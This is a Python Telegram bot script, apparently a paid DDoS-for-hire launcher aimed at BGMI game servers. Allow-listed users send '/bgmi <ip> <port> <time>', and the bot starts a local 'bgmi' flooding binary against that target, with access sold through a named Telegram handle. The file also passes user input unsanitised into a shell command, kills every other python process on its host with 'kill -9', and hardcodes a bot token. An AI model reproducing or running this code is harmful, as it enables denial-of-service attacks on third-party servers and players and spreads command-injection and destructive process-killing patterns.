import telebot
import subprocess
import os
import time
import requests
import signal

# --- CONFIGURATION ---
# Tera Bot Token
TOKEN = '8749691844:AAF-YCPj_CsbiFM83vkGQ6kfCW20d6fADFE'
bot = telebot.TeleBot(TOKEN)

# Admin ID aur File settings
admin_id = ["8787952549"]
USER_FILE = "users.txt"

# Ensure user file exists
if not os.path.exists(USER_FILE):
    with open(USER_FILE, "w") as f: f.write("")

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except:
        return []

# --- TERMINATOR LOGIC (Railway Conflict Fixer) ---
def kill_other_instances():
    """Kills any ghost processes to prevent 409 Conflict."""
    print("🧹 Cleaning ghost processes...")
    try:
        current_pid = os.getpid()
        # Kill other python processes to avoid 409 Conflict error
        os.system(f"ps -ef | grep python | grep -v {current_pid} | awk '{{print $2}}' | xargs kill -9 2>/dev/null")
    except Exception as e:
        print(f"Cleanup Error: {e}")

# --- HANDLERS ---

@bot.message_handler(commands=['start'])
def start_command(message):
    bot.reply_to(message, "⚡ **Bot Active on Railway!**\n\nUsage: `/bgmi <ip> <port> <time>`\nAdmin: @SODHI_OWNER")

@bot.message_handler(commands=['add'])
def add_user(message):
    if str(message.chat.id) in admin_id:
        parts = message.text.split()
        if len(parts) > 1:
            new_uid = parts[1]
            with open(USER_FILE, "a") as f:
                f.write(f"{new_uid}\n")
            bot.reply_to(message, f"✅ User {new_uid} added.")
    else:
        bot.reply_to(message, "❌ Admin only command.")

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    allowed_users = read_users()
    
    if user_id not in allowed_users and user_id not in admin_id:
        bot.reply_to(message, "🚫 **Access Denied!**\nBuy from @SODHI_OWNER")
        return

    cmd_parts = message.text.split()
    if len(cmd_parts) == 4:
        target, port, duration = cmd_parts[1], cmd_parts[2], cmd_parts[3]
        bot.send_message(message.chat.id, f"🚀 **Attack Sent!**\n🎯 Target: `{target}:{port}`\n⏳ Time: `{duration}s`")
        
        try:
            # Binary ko permission dena
            os.system("chmod +x bgmi")
            # Attack ko background mein chalana
            subprocess.Popen(f"./bgmi {target} {port} {duration} 500", shell=True)
        except Exception as e:
            bot.reply_to(message, f"❌ Execution Error: {str(e)}")
    else:
        bot.reply_to(message, "📝 **Usage:** /bgmi <ip> <port> <time>")

# --- MAIN ENGINE ---
if __name__ == "__main__":
    print("--- STARTING BOT ENGINE ---")
    
    # Instance cleaning
    kill_other_instances()
    
    # Telegram session reset
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/deleteWebhook?drop_pending_updates=true", timeout=10)
        print("Telegram session reset done.")
    except Exception as e:
        print(f"Session Reset Error: {e}")

    # Stabilization delay for Railway
    print("⏳ Stabilizing (10s)...")
    time.sleep(10)

    print("🚀 Bot is now Polling!")
    while True:
        try:
            bot.polling(none_stop=True, skip_pending=True, interval=2, timeout=60)
        except Exception as e:
            err = str(e)
            print(f"Error: {err}")
            if "Conflict" in err or "409" in err:
                kill_other_instances()
                time.sleep(20)
            else:
                time.sleep(5)
